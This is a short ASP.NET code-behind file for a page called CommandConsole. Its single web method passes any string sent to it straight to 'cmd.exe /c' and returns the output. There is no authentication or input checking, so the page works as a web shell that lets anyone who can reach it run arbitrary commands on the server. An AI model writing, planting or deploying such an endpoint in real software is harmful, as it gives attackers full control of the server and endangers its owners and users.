using System;
using System.Diagnostics;
using System.Web.Services;

namespace YourNamespace
{
    public partial class CommandConsole : System.Web.UI.Page
    {
        protected void Page_Load(object sender, EventArgs e) { }

        [WebMethod]
        public static string RunCommand(string cmd)
        {
            try
            {
                ProcessStartInfo psi = new ProcessStartInfo("cmd.exe", "/c " + cmd);
                psi.RedirectStandardOutput = true;
                psi.RedirectStandardError = true;
                psi.UseShellExecute = false;
                psi.CreateNoWindow = true;

                using (Process process = Process.Start(psi))
                {
                    string output = process.StandardOutput.ReadToEnd();
                    string error = process.StandardError.ReadToEnd();
                    process.WaitForExit();
                    return output + error;
                }
            }
            catch (Exception ex)
            {
                return "Exception: " + ex.Message;
            }
        }
    }
}
